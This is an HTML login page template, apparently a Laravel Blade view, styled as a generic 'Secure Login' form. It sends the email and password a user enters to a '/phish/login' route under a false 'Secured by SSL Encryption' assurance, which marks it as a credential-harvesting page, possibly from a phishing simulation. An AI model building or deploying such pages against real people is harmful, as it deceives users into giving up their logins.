<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <style>
        body {
            background: #0f172a;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #fff;
        }
        .box {
            background: #020617;
            padding: 30px;
            border-radius: 8px;
            width: 320px;
        }
        h2 {
            text-align: center;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 5px;
            border: none;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #2563eb;
            border: none;
            color: white;
            border-radius: 5px;
            cursor: pointer;
        }
        .small {
            font-size: 12px;
            margin-top: 10px;
            color: #94a3b8;
            text-align: center;
        }
    </style>
</head>

<body>
    <div class="box">
        <h2>Account Login</h2>

        <form method="POST" action="/phish/login">
            @csrf

            <input type="email" name="email" placeholder="Email address" required>
            <input type="password" name="password" placeholder="Password" required>

            <button type="submit">Sign In</button>
        </form>

        <div class="small">
            Secured by SSL Encryption
        </div>
    </div>
</body>
</html>
